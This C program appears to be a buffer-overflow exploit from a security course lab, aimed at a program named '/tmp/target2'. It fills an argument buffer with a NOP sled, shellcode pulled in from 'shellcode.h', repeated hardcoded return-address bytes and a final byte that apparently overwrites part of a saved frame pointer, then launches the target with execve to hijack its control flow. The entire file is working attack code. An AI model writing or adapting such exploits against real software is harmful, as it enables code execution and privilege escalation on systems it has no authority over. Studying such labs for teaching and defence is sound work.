#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  int length = strlen(shellcode);
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  char val = '\x90';
  int len = 200;
  char str[len];
  int i;

  for (i = 0; i < 40; i++) {
    str[i] = val;
  }

  int j;
  for (j = 0; j < length; j++) {
    str[i++] = shellcode[j];
  }

  for (i; i < 112; i) {
    //str[i++] = '\x4c';
    str[i++] = '\xfd';
    str[i++] = '\xff';
    str[i++] = '\xbf';
    str[i++] = '\x4c';
}

  str[112] = '\xa0';

  args[1] = str;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
